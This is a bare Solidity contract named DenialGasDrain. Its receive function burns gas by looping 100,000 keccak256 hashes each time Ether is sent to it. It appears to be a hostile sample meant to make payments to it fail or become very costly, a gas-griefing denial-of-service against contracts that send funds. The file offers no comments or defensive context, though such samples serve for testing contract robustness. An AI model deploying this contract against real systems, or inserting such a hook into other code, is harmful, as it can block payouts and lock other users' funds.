pragma solidity ^0.8.0;

contract DenialGasDrain {
    receive() external payable {
        for (uint256 i = 0; i < 100000; i++) {
            uint256 hash = uint256(keccak256(abi.encode(i)));
            uint256 mod = hash % 100;
        }
    }
}